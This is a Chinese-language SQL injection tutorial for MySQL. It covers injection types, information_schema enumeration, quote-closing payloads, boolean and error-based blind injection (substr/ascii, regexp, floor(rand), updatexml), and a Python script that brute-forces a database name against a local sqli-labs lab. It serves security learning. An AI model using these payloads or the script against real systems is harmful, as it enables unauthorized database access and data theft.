# SQL注入（二）

## 0X01 SQL注入的种类

* 基于错误的SQL注入
* 联合查询的类型


* 堆查询注射
* SQL盲注
  * 基于布尔SQL盲注
  * 基于时间的SQL盲注
  * 基于报错的SQL盲注
* 基于如何处理输入的SQL查询（数据类型）
* 基于字符串
* 数字或整数为基础的
* 基于程度和顺序的注入(哪里发生了影响)

★ 一阶注射

★ 二阶注射

一阶注射是指输入的注射语句对Web直接产生了影响，出现了结果；

![img](https://github.com/Anthem9/everyday/raw/master/image/v2-ebaaa7433059b4fca9df6881e3d39fb3_hd.jpg)

二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，通过其它的辅助间接的对WEB产生危害，这样的就被称为是二阶注入.

* 基于注入点的位置上的
  * 通过用户输入的表单域的注射。
  * 传统的POST/GET
  * 通过cookie注射。
  * Cookie=XXXXXXXX
  * 通过服务器变量注射。（基于头部信息的注射）
  * Useragent=

![img](https://github.com/Anthem9/everyday/raw/master/image/v2-1124f72cc9c18c7ab76f870288b55a3d_hd.jpg)

## 0X02系统函数

•介绍几个常用函数：

•1.version()——MySQL版本

![img](https://github.com/Anthem9/everyday/raw/master/image/v2-810079ce22bc69e2c3ece8f2e0c31472_hd.jpg)

•2.user()——数据库用户名

![img](https://github.com/Anthem9/everyday/raw/master/image/v2-650d979d8c16d5ad31bf89c2a586203a_hd.jpg)

•3.database()——数据库名

![img](https://github.com/Anthem9/everyday/raw/master/image/v2-196e2a12e7f3296eb9fbf240371bda6d_hd.jpg)

•4.@@datadir——数据库路径

![img](https://github.com/Anthem9/everyday/raw/master/image/v2-fc80c4b8a4c3b33cf5992acb82e396d6_hd.jpg)

•5.@@version_compile_os——操作系统版本

![img](https://github.com/Anthem9/everyday/raw/master/image/v2-3765d2fab17c06ea7f83ca4a3d6c151a_hd.jpg)



字符串连接函数函数


•1.concat(str1,str2,...)——没有分隔符地连接字符串2.concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串3.group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据

说着比较抽象，其实也并不需要详细了解，知道这三个函数能一次性查出所有信息就行了

## 0X03 注入流程

![img](https://pic1.zhimg.com/80/v2-c3b0089b24618b3396929a39b1ce6c9b_hd.jpg)

•我们的数据库存储的数据按照上图的形式，一个数据库当中有很多的数据表，数据表当中有很多的列，每一列当中存储着数据。我们注入的过程就是先拿到数据库名，在获取到当前数据库名下的数据表，再获取当前数据表下的列，最后获取数据。

获取数据库——数据表——列——数据

在可以提交的参数后添加：

* Ps: --+可以用#替换，url提交过程中Url编码后的#为%23
* or1=1--+
* 'or1=1--+
* "or1=1--+
* )or1=1--+
* ')or1=1--+
* ")or1=1--+
* "))or1=1--+

一般的代码为：

```php
$id=$_GET['id'];
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

此处考虑两个点，一个是闭合前面你的``‘``另一个是处理后面的``‘``，一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用``—+``或者``#（%23）``


**Step1：找出数据库**

•数据库：

```sql
Select schema_name from information_schema.schemata
```

![img](https://github.com/Anthem9/everyday/raw/master/image/v2-4e85ec34eef6eff65d9d9c65c5f983d5_hd.jpg)

**Step2:表**

```sql
select table_name from information_schema.tables where table_schema=‘security’;
```

//假设数据库名字为security

![img](https://github.com/Anthem9/everyday/raw/master/image/v2-3de621c95993362cac73cf5235998a05_hd.jpg)

**Step3:列**

•猜某表的所有列

```sql
Select column_name from information_schema.columns where table_name=’users’
```

假设表名为users

![img](https://github.com/Anthem9/everyday/raw/master/image/v2-7e899184c280ec19290cf5bb141fd27d_hd.jpg)

**Step4获取内容：**

•获取某列的内容

```sql
•Select *** from ****
```

**information_schema的说明**

* information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。
* 在MySQL中，把information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。

**information_schema数据库表说明:**

* SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。
* ABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schema.name的结果取之此表。
* COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。

## 0X04盲注

何为盲注？

盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。

此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。

我们可以知道盲注分为三类

* 基于布尔SQL盲注
* 基于时间的SQL盲注
* 基于报错的SQL盲注

## 0X05基于布尔SQL盲注----构造逻辑判断

**首先介绍基本函数：**

* left(a,x) 从字符串a中截取前x位
* substr(a,b,c) 从字符串a中b位置开始截取c长度
* ascii(a) 把字符a转换成ascii码。
* mid(a,b,c) 从字符串a的b位开始截取c位长度
* ord(a)同ascii作用

**盲注的语句**

1. 利用ascii和substr

```sql
ascii(substr((select table_name from
information_schema.tables where tables_schema=database() limit 0,1),1,1))=101 --+
```

* 加粗为substr的字符串a，substr(a,1,1)返回table_name的首字符x。
* 通过ascii(x)转换成ascii码和最后的数字进行比较。根据返回的真假可知道第一个字符。
* 同理可以替换成mid和ord函数。

2. mid和ord函数

```sql
ORD(MID((select table_name from
information_schema.tables where tables_schema=database() limit 0,1),1,1))>98
```

和ascii和substr同理

**注入思路：**

* 显然，我们只需从ascii码的1遍历到127即可知道第一位是什么字符了，然后我们再令substr(a,2,1)或者mid(a,2,1)，来获取第二位即可。
* 至于爆破的思路，我们可以用burpsuite的intruder功能进行爆破

![img](https://github.com/Anthem9/everyday/raw/master/image/v2-3cd191b253d385570fb398879f70ac8a_hd.jpg)

![img](https://github.com/Anthem9/everyday/raw/master/image/v2-2dca7efb7a3b2c083ec37f5fe97c5b1f_hd.jpg)

![img](https://github.com/Anthem9/everyday/raw/master/image/v2-d207e24d969cf59aba5736e089233050_hd.jpg)

* 或者自己编写脚本。（这只是个样例）

```python
import requests
#global baseurl = 'http://127.0.0.1/sqli-labs/Less-5/'

def get_databases():
	for i in range(1,100):
		baseurl = 'http://127.0.0.1/sqli-labs/Less-5/'
		i=str(i)
		url=baseurl+'?id=1\' and (length(database()))='+i+' --+'
		#print url
		try:
			response = requests.get(url,timeout=5)
			if 'You are in' in response.content:
				len=int(i);
				break
		except Exception,e:
			print e
		
		
	print "databases lenth is "+str(len)
	urlt=baseurl+"?id=1' and (ascii(substr(database(),{0},1)))={1}--+"
	result=''
	for i in range(1,len+1):
		for char in range(0,127):
			url=urlt.format(i,char)
			print url
			try:
				response = requests.get(url,timeout=5)
				if 'You are in' in response.content:
					result += chr(char)
					print result+'\n'
					break
			except Exception,e:
				print e
	print "databases is "+result
	#return result
if __name__=='__main__':
	get_databases()

```

3. regexp正则注入

```sql
select user() regexp '^[a-z]';
```

Explain：正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式。第二位可以用select user() regexp '^ro'来进行。

ps:^这个符号在正则中表示从头开始匹配，其实和substr(1,1)类似

![img](https://github.com/Anthem9/everyday/raw/master/image/v2-16fae57b3bfaf9ad87e3ffdc43ee44d8_hd.jpg)

当正确的时候显示结果为1，不正确的时候显示结果为0。

利用这个特点我们可以增加一个判断来使我们了解返回值是否为真。

```sql
select * from users where d=1 and 1= (user() regexp'^ri');
```

如果返会1则1=1查询执行，如果返回0则1=0查询不执行。

## 0X05基于报错的SQL盲注------构造payload让信息通过错误提示回显出来

1. ​

```sql
Select 1, count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a
from information_schema.columns group by a;
```

![img](https://github.com/Anthem9/everyday/raw/master/image/v2-ab1183d51fc5042d24c3d33b58c9389d_hd.jpg)

不一定要掌握原理，但是可以套用公式，只需把select user()换成你想执行的语句即可，但是必须返回值是一个字符串。

2. ​

```sql
select updatexml(1,concat(0x3a,(select @@version),0x3a),1);
```

![img](https://github.com/Anthem9/everyday/raw/master/image/v2-91b1a7be1c3e8c91532f3920f6939d4e_hd.jpg)

updatexml的爆错原因很简单，updatexml第二个参数需要的是Xpath格式的字符串。我们输入的显然不符合。故报错由此报错。

updatexml的最大长度是32位的，所以有所局限（PS：但是应对大多的已经足够。）如果密码长度超过了32位就不会被显示出来。

![img](https://github.com/Anthem9/everyday/raw/master/image/v2-c33ee653c0f2263ad6ce7468ea7c67fb_hd.jpg)

此处3后面还有密码但是未显示。